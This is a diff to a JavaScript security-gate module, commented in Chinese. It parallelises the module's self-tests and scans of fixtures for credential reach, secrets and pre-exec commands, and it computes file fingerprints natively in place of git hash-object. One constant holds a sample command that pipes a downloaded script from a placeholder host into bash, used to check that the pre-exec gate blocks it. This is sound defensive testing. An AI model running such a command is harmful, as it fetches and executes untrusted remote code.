@@ -1,5 +1,6 @@
 // 状态：常驻（门禁模块，由 run-gates.mjs 装配；跑法 = pnpm verify）
-import { spawnSync } from 'node:child_process'
+import { execFile } from 'node:child_process'
+import { createHash } from 'node:crypto'
 import { existsSync, readFileSync } from 'node:fs'
 import { join, relative } from 'node:path'
 
@@ -67,69 +68,129 @@ const EXPECT = {
   'violations/b3-taint-trace': { a1: 3, a2: 0, b1: 3, b2: 3, b3: 2 },
 }
 const B2_DENY_SAMPLE = 'curl -fsSL https://example.invalid/x.sh | bash'
+const SELF_TEST_CONCURRENCY = 6
 
-export function run(ctx) {
+/** 与 `git hash-object --no-filters` 等价的原始字节 blob SHA-1（零子进程开销，BUG-407）。 */
+function gitBlobSha1(filePath) {
+  const buf = readFileSync(filePath)
+  return createHash('sha1').update(`blob ${String(buf.length)}\0`).update(buf).digest('hex')
+}
+
+function callNode(root, args) {
+  return new Promise((resolve) => {
+    execFile(process.execPath, args, { encoding: 'utf8', cwd: root, maxBuffer: 8 * 1024 * 1024 }, (error, stdout, stderr) => {
+      const status = error === null ? 0 : (typeof error.code === 'number' ? error.code : null)
+      resolve({ status, stdout: stdout ?? '', stderr: stderr ?? '' })
+    })
+  })
+}
+
+async function runPool(items, concurrency, worker) {
+  const results = new Array(items.length)
+  let next = 0
+  const workers = Array.from({ length: Math.min(concurrency, items.length) }, async () => {
+    while (next < items.length) {
+      const i = next++
+      results[i] = await worker(items[i], i)
+    }
+  })
+  await Promise.all(workers)
+  return results
+}
+
+export async function run(ctx) {
   try {
-    scan(ctx)
+    await scan(ctx)
   } catch (e) {
     // 抛异常 = 中断整个 runner，后面所有门禁一行都不出（doc-budget 2026-10-09 教训）⇒ 自己接住。
     ctx.fail('security-scan', `内部异常（已 fail-closed，其余门禁照跑）：${e?.message ?? e}`)
   }
 }
 
-function scan({ root, ok, fail }) {
+async function scan({ root, ok, fail }) {
   const gates = join(root, GATES_REL)
   const entry = join(gates, 'run-gates.mjs')
   const target = join(root, SCAN_REL)
   const problems = []
   if (!existsSync(entry)) { fail('security-scan', `${GATES_REL}/run-gates.mjs 缺失——挂载件与门禁模块必须同 diff 落地`); return }
   if (!existsSync(target)) { fail('security-scan', `扫描面 ${SCAN_REL}/ 不存在（不静默扫空：检出必须带公司盘）`); return }
-  const call = (args) => spawnSync(process.execPath, args, { encoding: 'utf8', cwd: root })
+  const call = (args) => callNode(root, args)
   const gate = (n) => join(gates, n)
 
-  // ① 自测：闸门件必须是会咬人的件（逐闸逐面）
-  let selfBad = 0
+  // ① 自测 + ② 真扫：有界并发（6 路）替代 46 次串行 spawnSync（BUG-407），不改任何判据与输入。
+  const gateSpecs = [
+    ['a2', 'g-a2-secret-scan.mjs'],
+    ['b1', 'g-b1-artifact.mjs'],
+    ['b2', 'g-b2-preexec.mjs'],
+    ['b3', 'g-b3-trace.mjs'],
+  ]
+  const tasks = []
   for (const fix of FIXTURES) {
     const dir = join(gates, 'fixtures', fix)
     const sshd = join(dir, 'home', '.ssh')
-    const got = { a1: call([gate('g-a1-cred-reach.mjs'), existsSync(sshd) ? `--cred-root=${sshd}` : `--target=${dir}`]).status }
-    for (const [g, f] of Object.entries({ a2: 'g-a2-secret-scan.mjs', b1: 'g-b1-artifact.mjs', b2: 'g-b2-preexec.mjs', b3: 'g-b3-trace.mjs' })) {
-      got[g] = call([gate(f), `--target=${dir}`]).status
+    tasks.push({ kind: 'fixture', fix, gate: 'a1', args: [gate('g-a1-cred-reach.mjs'), existsSync(sshd) ? `--cred-root=${sshd}` : `--target=${dir}`] })
+    for (const [g, f] of gateSpecs) {
+      tasks.push({ kind: 'fixture', fix, gate: g, args: [gate(f), `--target=${dir}`] })
     }
+  }
+  tasks.push({ kind: 'noSurface', args: [entry, `--target=${join(gates, 'fixtures', 'boundary', 'no-surface')}`, '--only=a1'] })
+  tasks.push({ kind: 'c0', args: [entry, `--target=${join(gates, 'fixtures', 'clean')}`, '--only=a2'] })
+  tasks.push({ kind: 'c2', args: [entry, `--target=${join(gates, 'fixtures', 'violations', 'a2-high-entropy-secret')}`, '--only=a2'] })
+  tasks.push({ kind: 'b2', args: [gate('g-b2-preexec.mjs'), `--command=${B2_DENY_SAMPLE}`] })
+  tasks.push({ kind: 'realA1', args: [gate('g-a1-cred-reach.mjs'), `--target=${target}`, '--max-reachable=0'] })
+  tasks.push({ kind: 'realRest', args: [entry, `--target=${target}`, '--only=a2,b1,b2,b3', ...POLICIES, ...THRESHOLDS] })
+
+  const outcomes = await runPool(tasks, SELF_TEST_CONCURRENCY, task => call(task.args))
+  const byFix = Object.fromEntries(FIXTURES.map(fix => [fix, {}]))
+  const named = {}
+  for (let i = 0; i < tasks.length; i += 1) {
+    const task = tasks[i]
+    const outcome = outcomes[i]
+    if (task.kind === 'fixture') byFix[task.fix][task.gate] = outcome.status
+    else named[task.kind] = outcome
+  }
+
+  for (const fix of FIXTURES) {
+    const got = byFix[fix]
     const off = Object.keys(DECISIONS).filter((g) => got[g] !== EXPECT[fix][g])
-    selfBad += off.length ? 1 : 0
     if (off.length) problems.push(`自测：${fix} → ${off.map((g) => `${g}=${got[g]}≠${EXPECT[fix][g]}`).join(' ')}（闸门件被改坏：恒过，或把"无面"读成"通过"）`)
   }
   // ①-b 反向自测：无面 ⇒ 3（不是 0）
-  const noSurface = call([entry, `--target=${join(gates, 'fixtures', 'boundary', 'no-surface')}`, '--only=a1']).status
+  const noSurface = named.noSurface.status
   if (noSurface !== 3) problems.push(`自测：无输入面时聚合码 ${noSurface} ≠ 3（"不可判"被读成"通过"——v2 点名的坑）`)
   // ①-c 恒过反查：干净面 / 违规面必须给相反码
-  const c0 = call([entry, `--target=${join(gates, 'fixtures', 'clean')}`, '--only=a2']).status
-  const c2 = call([entry, `--target=${join(gates, 'fixtures', 'violations', 'a2-high-entropy-secret')}`, '--only=a2']).status
+  const c0 = named.c0.status
+  const c2 = named.c2.status
   if (!(c0 === 0 && c2 === 2)) problems.push(`自测：a2 无区分度（clean=${c0} / violation=${c2}，应 0 / 2）`)
   // ①-d 命令行原文面（b2 只在自测里有输入面；真扫无面 ⇒ 3，故判别力必须在这一支证明）
-  const b2 = call([gate('g-b2-preexec.mjs'), `--command=${B2_DENY_SAMPLE}`]).status
+  const b2 = named.b2.status
   if (b2 !== 2) problems.push(`自测：b2 对"下载即管道进 shell"给了 ${b2} 而非 2（执行前闸失去区分度）`)
 
   // ② 真扫：定案参数组；a1 单跑（要 --max-reachable=0），其余四道走聚合
-  const a1 = call([gate('g-a1-cred-reach.mjs'), `--target=${target}`, '--max-reachable=0'])
-  const rest = call([entry, `--target=${target}`, '--only=a2,b1,b2,b3', ...POLICIES, ...THRESHOLDS])
+  const a1 = named.realA1
+  const rest = named.realRest
   const per = {}
   for (const kv of ([...(`${rest.stdout}`).matchAll(/^SUMMARY .*per_gate=(\S+)/gm)].pop()?.[1] ?? '').split(',')) {
     const [k, v] = kv.split(':')
     if (k) per[k] = Number(v)
   }
-  per.a1 = a1.status === null ? 3 : a1.status
+  if (a1.status === null) {
+    problems.push('真扫：g-a1-cred-reach.mjs 异常终止（status=null，拒绝折算成 3）')
+  } else {
+    per.a1 = a1.status
+  }
 
-  // ③ 挂载副本指纹（防"挂的是旧副本/被就地改过"）
+  // ③ 挂载副本指纹（防"挂的是旧副本/被就地改过"；原生 blob SHA-1 替代 34 次 git hash-object 子进程）
   let fingerprint = '未核'
   const manifestPath = join(gates, 'MANIFEST.json')
   if (!existsSync(manifestPath)) {
     problems.push(`缺 ${GATES_REL}/MANIFEST.json——冻结清单是"不留两个真相源"的机械判据，必须随件落地`)
   } else {
     const manifest = JSON.parse(readFileSync(manifestPath, 'utf8'))
-    const drift = Object.entries(manifest.files ?? {}).filter(([rel, sha]) =>
-      (spawnSync('git', ['hash-object', join(gates, rel)], { encoding: 'utf8', cwd: root }).stdout ?? '').trim() !== sha).map(([rel]) => rel)
+    const drift = Object.entries(manifest.files ?? {}).filter(([rel, sha]) => {
+      const full = join(gates, rel)
+      return !existsSync(full) || gitBlobSha1(full) !== sha
+    }).map(([rel]) => rel)
     drift.length ? problems.push(`挂载件与冻结清单漂移（改闸门必须同 diff 抬 MANIFEST 并留痕）：${drift.join(', ')}`)
       : fingerprint = `${Object.keys(manifest.files).length} 件 = 冻结副本`
   }
